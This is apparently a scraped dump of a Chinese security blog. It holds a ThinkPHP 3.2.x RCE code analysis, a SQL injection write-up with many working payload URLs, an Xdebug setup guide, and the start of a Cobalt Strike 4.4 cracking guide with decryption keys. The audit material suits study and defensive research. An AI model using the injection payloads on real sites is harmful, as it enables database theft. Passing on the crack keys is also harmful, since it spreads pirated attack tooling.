漏洞分析 Application/Home/Controller/IndexController.class.php assign方法中第一个变量可控 public function test($value){ $this-&gt;assign($value); $this-&gt;display(); } 跟进assign函数 ThinkPHP/Library/Think/Controller.class.php protected function assign($name,$value='') { $this-&gt;view-&gt;assign($name,$value); return $this; } 调用的是ThinkPHP/Library/Think/View.class.php中的assign函数， 此时进入else分支，我们传进去的$value被赋值给$this-&gt;tVar[$name] public function assign($name,$value=''){ if(is_array($name)) { $this-&gt;tVar = array_merge($this-&gt;tVar,$name); }else { $this-&gt;tVar[$name] = $value; } } 然后返回， 无参调用 display 函数，跟进display函数 调用的是ThinkPHP/Library/Think/View.class.php的display函数 protected function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') { $this-&gt;view-&gt;display($templateFile,$charset,$contentType,$content,$prefix); } 继续跟进 开始解析并获取模板文件内容，此时模板文件路径和内容为空 public function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') { G('viewStartTime'); // 视图开始标签 Hook::listen('view_begin',$templateFile); // 解析并获取模板内容 $content = $this-&gt;fetch($templateFile,$content,$prefix); // 输出模板内容 $this-&gt;render($content,$charset,$contentType); // 视图结束标签 Hook::listen('view_end'); } 进入ThinkPHP/Library/Think/View.class.php的fetch函数后， 这里会先判断模板存不存在，模板文件不存在直接返回，所以开始需要创建模板文件 接着判断是不是php类型模板，不是进入else分支。 接着$params 被赋值，var即为为我们传进去的日志路径，file为模板文件的路径。 public function fetch($templateFile='',$content='',$prefix='') { if(empty($content)) { $templateFile = $this-&gt;parseTemplate($templateFile); // 模板文件不存在直接返回 if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile); }else{ defined('THEME_PATH') or define('THEME_PATH', $this-&gt;getThemePath()); } // 页面缓存 ob_start(); ob_implicit_flush(0); if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // 使用PHP原生模板 $_content = $content; // 模板阵列变量分解成为独立变量 extract($this-&gt;tVar, EXTR_OVERWRITE); // 直接载入PHP模板 empty($_content)?include $templateFile:eval('?&gt;'.$_content); }else{ // 视图解析标签 $params = array('var'=&gt;$this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix); Hook::listen('view_parse',$params); } // 获取并清空缓存 $content = ob_get_clean(); // 内容过滤标签 Hook::listen('view_filter',$content); // 输出模板文件 return $content; } 接着进入ThinkPHP/Library/Think/Hook.class.php的listen函数，经过一些判断，进入exec函数 static public function listen($tag, &amp;$params=NULL) { if(isset(self::$tags[$tag])) { if(APP_DEBUG) { G($tag.'Start'); trace('[ '.$tag.' ] --START--','','INFO'); } foreach (self::$tags[$tag] as $name) { APP_DEBUG &amp;&amp; G($name.'_start'); $result = self::exec($name, $tag,$params); if(APP_DEBUG){ G($name.'_end'); trace('Run '.$name.' [ RunTime:'.G($name.'_start',$name.'_end',6).'s ]','','INFO'); } if(false === $result) { // 如果返回false 则中断插件执行 return ; } } if(APP_DEBUG) { // 记录行为的执行日志 trace('[ '.$tag.' ] --END-- [ RunTime:'.G($tag.'Start',$tag.'End',6).'s ]','','INFO'); } } return; } 接着exec函数把$params 带进ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php的run函数处理 static public function exec($name, $tag,&amp;$params=NULL) { if('Behavior' == substr($name,-8) ){ // 行为扩展必须用run入口方法 $tag = 'run'; } $addon = new $name(); return $addon-&gt;$tag($params); } public function run(&amp;$_data){ $engine = strtolower(C('TMPL_ENGINE_TYPE')); $_content = empty($_data['content'])?$_data['file']:$_data['content']; $_data['prefix'] = !empty($_data['prefix'])?$_data['prefix']:C('TMPL_CACHE_PREFIX'); if('think'==$engine){ // 采用Think模板引擎 if((!empty($_data['content']) &amp;&amp; $this-&gt;checkContentCache($_data['content'],$_data['prefix'])) || $this-&gt;checkCache($_data['file'],$_data['prefix'])) { // 缓存有效 //载入模版缓存文件 Storage::load(C('CACHE_PATH').$_data['prefix'].md5($_content).C('TMPL_CACHFILE_SUFFIX'),$_data['var']); }else{ $tpl = Think::instance('Think\\\\Template'); // 编译并加载模板文件 $tpl-&gt;fetch($_content,$_data['var'],$_data['prefix']); } }else{ // 调用第三方模板引擎解析和输出 if(strpos($engine,'\\\\')){ $class = $engine; }else{ $class = 'Think\\\\Template\\\\Driver\\\\'.ucwords($engine); } if(class_exists($class)) { $tpl = new $class; $tpl-&gt;fetch($_content,$_data['var']); }else { // 类没有定义 E(L('_NOT_SUPPORT_').': ' . $class); } } } 进入ThinkPHP/Library/Think/Template.class.php的fetch函数 public function fetch($templateFile,$templateVar,$prefix='') { $this-&gt;tVar = $templateVar; $templateCacheFile = $this-&gt;loadTemplate($templateFile,$prefix); Storage::load($templateCacheFile,$this-&gt;tVar,null,'tpl'); } 进入最后的load函数，$var不为空则使用extract方法的EXTR_OVERWRITE默认描述对变量值进行覆盖， 之后include该日志文件路径，造成文件包含。 public function load($_filename,$vars=null){ if(!is_null($vars)){ extract($vars, EXTR_OVERWRITE); } include $_filename; } 参考文章 【漏洞通报】ThinkPHP3.2.x RCE漏洞通报 ThinkPHP3.2.x RCE复现 炒冷饭之ThinkPHP3.2.X RCE漏洞分析 ","link":"https://bewhale.github.io/post/PHP代码审计—ThinkPHP3.2.X远程代码执行/"},{"title":"PHP代码审计—ThinkPHP3.2.X_find_select_delete注入(2018-08-23)","content":"环境搭建 下载：ThinkPHP3.2.3完整版 - ThinkPHP框架 数据库配置 创建数据库thinkphp,表为user,含有三个字段id,username,pass 修改Application\\Common\\Conf\\config.php配置文件，添加数据库配置信息 &lt;?php return array( 'DB_TYPE' =&gt; 'mysql', // 数据库类型 'DB_HOST' =&gt; '127.0.0.1', // 服务器地址 'DB_NAME' =&gt; 'thinkphp', // 数据库名 'DB_USER' =&gt; 'root', // 用户名 'DB_PWD' =&gt; 'root', // 密码 'DB_PORT' =&gt; '3306', // 端口 'DB_PREFIX' =&gt; '', // 数据库表前缀 'DB_PARAMS' =&gt; array(), // 数据库连接参数 'DB_DEBUG' =&gt; TRUE, // 数据库调试模式 开启后可以记录SQL日志 'DB_FIELDS_CACHE' =&gt; true, // 启用字段缓存 'DB_CHARSET' =&gt; 'utf8', // 数据库编码默认采用utf8 'DB_DEPLOY_TYPE' =&gt; 0, // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器) 'DB_RW_SEPARATE' =&gt; false, // 数据库读写是否分离 主从式有效 'DB_MASTER_NUM' =&gt; 1, // 读写分离后 主服务器数量 'DB_SLAVE_NO' =&gt; '', // 指定从服务器序号 ); 数据库测试 在thinkphp32\\Application\\Home\\Controller\\IndexController.class.php 创建函数，内容如下： public function test(){ $data = M('users')-&gt;where('id=1')-&gt;select(); var_dump($data); } 浏览器访问测试： http://127.0.0.1/index.php/Home/Index/test http://127.0.0.1/index.php?m=Home&amp;c=index&amp;a=test http://127.0.0.1/index.php?s=/Home/index/test select/find 在thinkphp32\\Application\\Home\\Controller\\IndexController.class.php 创建函数，内容如下： &lt;?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $this-&gt;show('&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;','utf-8'); } public function test(){ $id = I(id); $data = M('users')-&gt;select($id); var_dump($data); } } payload where #第一种payload #联合查询 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=1=1 union select 1,2,user() %23 #报错 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=extractvalue(0x7e,concat(0x7e,user())) %23 #逻辑判断 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=1=1 %23 #第二种payload #联合查询 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=1=1) union select 1,2,user() %23 #报错 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=extractvalue(0x7e,concat(0x7e,user()))) %23 #逻辑判断 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=1=1) %23 field #注:请保证以,为分割payload,保证分割得到的每一部分均含有至少一个空格(或其他parseKey中匹配的字符),否则该部分会被一对`包裹;并且需要知道目标数据库中至少1个数据表 #联合查询 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[field]=1 from users union select user()%23 #报错 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[field]=1 , extractvalue(0x7e, concat(0x7e, user())) from users %23 #逻辑判断 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[field]=* from users where 1=1 %23 table # 注:请保证以,为分割payload,保证分割得到的每一部分均含有至少一个空格(或其他parseKey中匹配的字符),否则该部分会被一对`包裹; # 并且需要知道目标数据库中至少1个数据表 #联合查询 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[table]=users union select 1,2,user() %23 #报错 http://127.0.0.1/index.php?s=/Home/index/test&amp;?id[table]=users where extractvalue(0x7e, concat(0x7e, user())) %23 #逻辑判断 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[table]=users where 1=1 %23 join #联合查询 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[join][]=union select 1,2 %23 #报错 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[join][]=where extractvalue(0x7e,concat(0x7e,user())) %23 #逻辑判断 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[join][]=where 1=1 %23 force #注:审计环境设置的索引为字段id,使用payload时请修改为对应的索引,在未知索引或不存在索引的情况下无法使用 #联合查询 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[force]=id) union select 1,2,user() %23 #报错 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[force]=id) where extractvalue(0x7e,concat(0x7e,version())) %23 #逻辑判断 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[force]=id) where 1=1 %23 group #注:需要已知所查数据表中任意一字段名 #联合查询 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[group]=id union select 1,2,user() %23 having #注:需要已知所查数据表中任意一字段名 #联合查询 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[having]=id union select 1,2,user() %23 #逻辑判断 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[having]=1=1 %23 order #报错 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[order]=extractvalue(0x7e,concat(0x7e,version())) %23 #逻辑判断 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[order]=1=1 %23 limit #限于5.0.0&lt; MySQL &lt;5.6.6版本才能使用 #报错 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[page][]=1&amp;id[page][]=1 procedure analyse(extractvalue(0x7e,concat(0x7e, version())),number) %23 alias http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- 漏洞分析 首先用 I 方法获取id的值，跟进I方法，过滤方式 filter 默认为 DEFAULT_FILTER ，对应值为htmlspecialchars。 $filters = isset($filter)?$filter:C('DEFAULT_FILTER'); 然后判断传入的参数是不是数组，使用filter对应的方法处理一边，但是因为默认为htmlspecialchars，对其值进行实体编码，所以并没什么影响 $data = is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤 然后在380行进行了强制类型转换,默认为字符型，所以也没影响 if(!empty($type)){ switch(strtolower($type)){ case 'a': // 数组 $data = (array)$data; break; case 'd': // 数字 $data = (int)$data; break; case 'f': // 浮点 $data = (float)$data; break; case 'b': // 布尔 $data = (boolean)$data; break; case 's': // 字符串 default: $data = (string)$data; } } 最后在402行,如果传值为数组时，会进行正则过滤 is_array($data) &amp;&amp; array_walk_recursive($data,'think_filter'); 但是这里的过滤关键字并不针对SQL注入漏洞，可以轻易饶过 if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){ $value .= ' '; } 然后再看select函数的内部实现 当$options为数字或者字符串类型的时候，直接指定当前查询表的主键作为查询字段 if(is_string($options) || is_numeric($options)) { // 根据主键查询 if(strpos($options,',')) { $where[$pk] = array('IN',$options); }else{ $where[$pk] = $options; } $options = array(); $options['where'] = $where; } 满足$options 和 $pk主键同时为数组时，进入根据复合主键查询，但这个对于表只设置一个主键的时候不成立。 elseif (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) 如果 $options 为 false , 用于子查询 不查询只返回SQL elseif(false === $options){ // 用于子查询 不查询只返回SQL $options['fetch_sql'] = true; } 那么就可以使$options为数组，同时找到一个表只有一个主键，就可以绕过三次判断，直接进入_parseOptions进行解析。 然后看表达式分析 _parseOptions 方法 $options我们可控，那么就可以控制为数组类型，传入$options['table']或$options['alias']等等，都没有进行过滤 传入$options['where'] 时，设置$options['where']的值为字符串，即可绕过字段类型的验证。 protected function _parseOptions($options=array()) { if(is_array($options)) ////当$options为数组的时候 直接与 $this-&gt;options 数组进行 合并 $options = array_merge($this-&gt;options,$options); if(!isset($options['table'])){ // 自动获取表名 $options['table'] = $this-&gt;getTableName(); $fields = $this-&gt;fields; }else{ // 指定数据表 则重新获取字段列表 但不支持类型检测 $fields = $this-&gt;getDbFields(); } // 数据表别名 if(!empty($options['alias'])) { $options['table'] .= ' '.$options['alias']; //直接进行了拼接 } // 记录操作的模型名称 $options['model'] = $this-&gt;name; // 字段类型验证， 如果不设置where，或者设置为字符串，这里即可绕过 if(isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) { // 对数组查询条件进行字段类型检查 foreach ($options['where'] as $key=&gt;$val){ $key = trim($key); if(in_array($key,$fields,true)){ if(is_scalar($val)) { $this-&gt;_parseType($options['where'],$key); } }elseif(!is_numeric($key) &amp;&amp; '_' != substr($key,0,1) &amp;&amp; false === strpos($key,'.') &amp;&amp; false === strpos($key,'(') &amp;&amp; false === strpos($key,'|') &amp;&amp; false === strpos($key,'&amp;')){ if(!empty($this-&gt;options['strict'])){ E(L('_ERROR_QUERY_EXPRESS_').':['.$key.'=&gt;'.$val.']'); } unset($options['where'][$key]); } } } // 查询过后清空sql表达式组装 避免影响下次查询 $this-&gt;options = array(); // 表达式过滤 $this-&gt;_options_filter($options); return $options; } 然后返回，ThinkPHP\\Library\\Think\\Model.class.php $options = $this-&gt;_parseOptions($options); .... // 重点关注 $resultSet = $this-&gt;db-&gt;select($options); 跟进 this−&gt;db−&gt;select(this-&gt;db-&gt;select(this−&gt;db−&gt;select(options) public function select($options=array()) { $this-&gt;model = $options['model']; $this-&gt;parseBind(!empty($options['bind'])?$options['bind']:array()); $sql = $this-&gt;buildSelectSql($options);// 生成执行sql语句 $result = $this-&gt;query($sql,!empty($options['fetch_sql']) ? true : false);// 执行sql语句 return $result; } 跟进sql语句构建函数 buildSelectSql public function buildSelectSql($options=array()) { if(isset($options['page'])) { // 根据页数计算limit,分页控制，这里强制转换成整数了，无法利用 list($page,$listRows) = $options['page']; $page = $page&gt;0 ? $page : 1; $listRows= $listRows&gt;0 ? $listRows : (is_numeric($options['limit'])?$options['limit']:20); $offset = $listRows*($page-1); $options['limit'] = $offset.','.$listRows; } $sql = $this-&gt;parseSql($this-&gt;selectSql,$options); return $sql; } 继续跟进 parseSql 方法 public function parseSql($sql,$options=array()){ $sql = str_replace( array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%LOCK%','%COMMENT%','%FORCE%'), array( $this-&gt;parseTable($options['table']), $this-&gt;parseDistinct(isset($options['distinct'])?$options['distinct']:false), $this-&gt;parseField(!empty($options['field'])?$options['field']:'*'), $this-&gt;parseJoin(!empty($options['join'])?$options['join']:''), $this-&gt;parseWhere(!empty($options['where'])?$options['where']:''), $this-&gt;parseGroup(!empty($options['group'])?$options['group']:''), $this-&gt;parseHaving(!empty($options['having'])?$options['having']:''), $this-&gt;parseOrder(!empty($options['order'])?$options['order']:''), $this-&gt;parseLimit(!empty($options['limit'])?$options['limit']:''), $this-&gt;parseUnion(!empty($options['union'])?$options['union']:''), $this-&gt;parseLock(isset($options['lock'])?$options['lock']:false), $this-&gt;parseComment(!empty($options['comment'])?$options['comment']:''), $this-&gt;parseForce(!empty($options['force'])?$options['force']:'') ),$sql); return $sql; } 这里对SQL模板语句进行替换, 皆未进行替换。 以where部分为例,parseWhere 方法 if(is_string($where)) { // 直接使用字符串条件 $whereStr = $where; }else{ // 使用数组表达式 ...... foreach ($where as $key=&gt;$val){ if(is_numeric($key)){ $key = '_complex'; } if(0===strpos($key,'_')) { // 解析特殊条件表达式 $whereStr .= $this-&gt;parseThinkWhere($key,$val); }else{ ...... } } } 当where部分为字符串时，直接进行了拼接，所以最简单粗暴的就直接构造 http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=0 union select 1,2,user() %23 当where部分为 数组表达式时，遍历数组key、value值，当key以_开头时进入特殊表达式解析函数parseThinkWhere protected function parseThinkWhere($key,$val) { $whereStr = ''; switch($key) { case '_string': // 字符串模式查询条件 $whereStr = $val; break; case '_complex': // 复合查询条件 $whereStr = substr($this-&gt;parseWhere($val),6); break; case '_query': // 字符串模式查询条件 parse_str($val,$where); if(isset($where['_logic'])) { $op = ' '.strtoupper($where['_logic']).' '; unset($where['_logic']); }else{ $op = ' AND '; } $array = array(); foreach ($where as $field=&gt;$data) $array[] = $this-&gt;parseKey($field).' = '.$this-&gt;parseValue($data); $whereStr = implode($op,$array); break; } return '( '.$whereStr.' )'; } 可以看到，当$key 为 _string时，直接将 $val 复制给 $whereStr 最后 拼接在了一对 括号 里面返回，所以这里又有了另外一种payload http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=0) union select 1,2,user() %23 delete &lt;?php namespace Home\\Controller; use Think\\Controller; class IndexController extends Controller { public function index(){ $this-&gt;show('&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;','utf-8'); } public function test(){ $id = I(id); $data = M('users')-&gt;delete($id); var_dump($data); } } payload table部分 #报错 http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[table]=users where extractvalue(0x7e, concat(0x7e, version())) %23 #逻辑判断 http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[table]=users where 1=1 %23 where部分 #报错 http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=extractvalue(0x7e,concat(0x7e,version())) #逻辑判断 http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1=1 order部分 #报错 http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1!=1&amp;id[order]=extractvalue(0x7e, concat(0x7e, version())) %23 #逻辑判断 http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1!=1&amp;id[order]=1=1 %23 limit部分 #限于5.0.0&lt; MySQL &lt;5.6.6版本才能使用 #报错 http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1!=1&amp;id[order]=extractvalue(0x7e, concat(0x7e, version())) %23 comment部分 #报错 http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[comment]=*/extractvalue(0x7e,concat(0x7e, version())) %23 #逻辑判断 http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[comment]=*/1=1 %23 漏洞分析 delete函数和select/find函数类似，直接进入 delete 函数 在解析完$options之后，还对$options['where']判断了一下是否为空， 所以where需要我们传一下值 $options = $this-&gt;_parseOptions($options); if(empty($options['where'])){ // 如果条件为空 不进行删除操作 除非设置 1=1 return false; } ...... $result = $this-&gt;db-&gt;delete($options); ...... 然后跟进 $this-&gt;db-&gt;delete($options) public function delete($options=array()) { $this-&gt;model = $options['model']; $this-&gt;parseBind(!empty($options['bind'])?$options['bind']:array()); $table = $this-&gt;parseTable($options['table']); $sql = 'DELETE FROM '.$table; if(strpos($table,',')){// 多表删除支持USING和JOIN操作 if(!empty($options['using'])){ $sql .= ' USING '.$this-&gt;parseTable($options['using']).' '; } $sql .= $this-&gt;parseJoin(!empty($options['join'])?$options['join']:''); } $sql .= $this-&gt;parseWhere(!empty($options['where'])?$options['where']:''); if(!strpos($table,',')){ // 单表删除支持order和limit $sql .= $this-&gt;parseOrder(!empty($options['order'])?$options['order']:'') .$this-&gt;parseLimit(!empty($options['limit'])?$options['limit']:''); } $sql .= $this-&gt;parseComment(!empty($options['comment'])?$options['comment']:''); return $this-&gt;execute($sql,!empty($options['fetch_sql']) ? true : false); } 在跟进到 parseWhere protected function parseWhere($where) { $whereStr = ''; if(is_string($where)) { // 直接使用字符串条件 $whereStr = $where; }else{ // 使用数组表达式 ..... } return empty($whereStr)?'':' WHERE '.$whereStr; } 最终在前面拼接了 WHERE 直接返回，无任何过滤 http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=extractvalue(0x7e,concat(0x7e,version())) 如何在table部分注入,需要吧parseWhere 方法里面最后拼接的 WHERE 给注释掉，否早语法报错 http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=123&amp;id[table]=users where extractvalue(0x7e, concat(0x7e, version())) %23 // 最终拼接的语句 DELETE FROM users where extractvalue(0x7e,concat(0x7e,version())) # WHERE 123 参考文章 ThinkPHP3.2.3代码审计 - Article_kelp - 博客园 thinkphp3.2_find_select_delete注入 - 先知社区 ThinkPHP3.2 框架sql注入漏洞分析(2018-08-23) - 先知社区 Thinkphp3.x/5.x系列漏洞总结学习 - T00ls.Com ","link":"https://bewhale.github.io/post/PHP代码审计—ThinkPHP3.2.X_find_select_delete注入(2018-08-23)/"},{"title":"PHP代码审计—环境搭建","content":"0x00 前言 采用Phpstorm+Phpstudy+XDebug 相关链接： Download PhpStorm: Lightning-Smart PHP IDE 小皮面板(phpstudy) - 让天下没有难配的服务器环境！ 0x01 phpstudy配置 先添加一个网站 Xdebug配置 phpstudy默认自带Xdebug，找到对应版本的php设置里面打开即可，自己设置一个监听端口 0x02 PHPStorm配置 phpstorm配置php，选择phpstudy中使用的php路径 配置Xdebug，端口为之前 phpstudy 配置的端口，保持一致 DBGp Proxy配置 IDE key 和 php.ini 的xdebug的 idekey 一致，默认为 PHPSTORM 端口 和 设置的 xdebug 的 端口一致 Servers设置 调试器选xdebug 添加配置 新建php web page页面 验证连接 点击小电话 开始监听 以 调试 0x03 浏览器配置 浏览器插件商店 搜索xdebug helper 安装即可 Edge浏览器插件下载地址： Xdebug helper - Microsoft Edge Addons 安装成功后右键进入扩展选项 在PHP的配置文件中对xdebug的设置需要特别注意，将xdebug.remote_autostart设置为off 如果设置为on，则会忽略在浏览器中是选择Debug还是Disable，都会自动进行调试 ;开启远程调试自动启动 xdebug.remote_autostart = Off 这样，xdebug helper就设置好了 0x04 遇到的问题 Phpstorm+XDEBUG调试的时候超时解决办法 在使用Phpstorm+XDEBUG进行调试过程中，分析会花费较长时间， 有的时候还没有调试完连接就已经断开， 这时候就需要重新进入调试或者在函数深处继续打断点 可以修改超时时间来解决问题，修改完记得重启服务。 方法一： 在 apache 配置文件 httpd.conf 中增加如下配置，将超时时间改大一点 Timeout 3600 FcgidIOTimeout 3600 FcgidIdleTimeout 3600 IPCConnectTimeout 3600 IPCCommTimeout 3600 方法二： phpstudy 的话也可以在 vhosts.conf 里面的配置文件中加上几句代码增加两行代码 IPCConnectTimeout 300000 IPCCommTimeout 300000 如下 &lt;VirtualHost _default_:80&gt; DocumentRoot &quot;D:/phpstudy_pro/WWW&quot; FcgidInitialEnv PHPRC &quot;D:/phpstudy_pro/Extensions/php/php5.6.9nts&quot; AddHandler fcgid-script .php IPCConnectTimeout 300000 IPCCommTimeout 300000 FcgidWrapper &quot;D:/phpstudy_pro/Extensions/php/php5.6.9nts/php-cgi.exe&quot; .php &lt;Directory &quot;D:/phpstudy_pro/WWW&quot;&gt; Options FollowSymLinks ExecCGI AllowOverride All Order allow,deny Allow from all Require all granted DirectoryIndex index.php index.html &lt;/Directory&gt; ErrorDocument 400 /error/400.html ErrorDocument 403 /error/403.html ErrorDocument 404 /error/404.html ErrorDocument 500 /error/500.html ErrorDocument 501 /error/501.html ErrorDocument 502 /error/502.html ErrorDocument 503 /error/503.html ErrorDocument 504 /error/504.html ErrorDocument 505 /error/505.html ErrorDocument 506 /error/506.html ErrorDocument 507 /error/507.html ErrorDocument 510 /error/510.html &lt;/VirtualHost&gt; 方法三： php.ini 增加 修改如下配置 xdebug.remote_cookie_expire_time = 3600 max_execution_time=3600 max_input_time=3600 default_socket_timeout = 3600 参考文章 Configure Xdebug | PhpStorm phpstorm配置xdebug 3.0最新教程 phpstorm调试环境XDebug搭建 phpstorm 使用 Xdebug 调试代码 ","link":"https://bewhale.github.io/post/PHP代码审计—环境搭建/"},{"title":"CobaltStrike4.4汉化破解及特征去除","content":"0x00 java境安装 windows安装java就不多说，主要说下linux ORACLE 官网下载JDK 地址 https://www.oracle.com/java/technologies/javase-jdk8-downloads.html 解压文件并移动至/opt tar -xzvf jdk-8u91-linux-x64.tar.gz -C /opt 设置环境变量, 修改全局配置文件 sudo vim ~/.bashrc 添加下列内容 #set oracle jdk environment export JAVA_HOME=/opt/jdk1.8.0_251 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH 让配置文件生效 source /etc/profile 注：该命令通常用命令“.”来替代，如：source .bash_rc 与 . .bash_rc 是等效的。 验证安装是否成功 java -version 显示java版本 javac 有提示 如果有软件还是找不到java环境，用update-alternatives设置管理java 安装并注册, /opt/jdk1.8.0_91/替换为自己jdk目录，用update-alternatives管理java版本 # --install needs &lt;link&gt; &lt;name&gt; &lt;path&gt; &lt;priority&gt; update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_91/bin/java 1 update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_91/bin/javac 1 若需要其他的就用相同的方法安装如下 sudo update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_91/bin/java 50 sudo update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_91/bin/javac 50 sudo update-alternatives --install /usr/bin/javah javah /opt/jdk1.8.0_91/bin/javah 50 sudo update-alternatives --install /usr/bin/javaws javaws /opt/jdk1.8.0_91/bin/javaws 50 sudo update-alternatives --install /usr/bin/javap javap /opt/jdk1.8.0_91/bin/javap 50 update-alternatives --set java /opt/jdk1.8.0_91/bin/java update-alternatives --set javac /opt/jdk1.8.0_91/bin/javac 查看安装结果 update-alternatives --config java update-alternatives --config javac Ubuntu安装java后，提示 [-] keytool is not in $PATH install the Java Developer Kit 建立一个软连接即可 /usr/java/jdk/替换为自己的jdk目录 ln -s /usr/java/jdk/bin/keytool /usr/bin/ 0x01 CS下载、破解与汉化 官方包下载 CobaltStrike4.4 官方包下载 官方hash验证地址： https://verify.cobaltstrike.com/ windows 验证命令 certutil -hashfile cobaltstrike.jar SHA256 破解与汉化 采用javaagent+javassist的方式动态修改jar包，可直接加载原版cobaltstrike.jar，理论上支持到目前为止的所有4.x版本 仓库地址： Twi1ight/CSAgent: CobaltStrike 4.x通用白嫖及汉化加载器 CSAgent.zip 下载地址： https://github.com/Twi1ight/CSAgent/releases/download/v1.2/CSAgent.zip 破解步骤 下载CSAgent.zip解压，将原版cobaltstrike.jar放到解压目录中，确保CSAgent.jar、resources文件夹、scripts文件夹和cobaltstrike.jar处于同级目录 替换cobaltstrike、teamserver、agscript、c2lint、cobaltstrike.bat文件中的解密key，目前内置的key为4.4版本,各个版本的官方解密key： 4.0 1be5be52c6255c33558e8a1cb667cb06 4.1 80e32a742060b884419ba0c171c9aa76 4.2 b20d487addd4713418f2d5a3ae02a7a0 4.3 3a4425490f389aeec312bdd758ad2b99 4.4 5e98194a01c6b48fa582a6a9fcbb92d6 正常使用teamserver和cobaltstrike脚本启动即可，用法与以前无任何差别，windows使用cobaltstrike.bat启动 对于仅想使用破解功能的朋友，只需删除resources文件夹和scripts文件夹即可去除汉化 0x02 CS启动与连接 服务端启动 linux 启动参数 ./teamserver &lt;host&gt; &lt;password&gt; 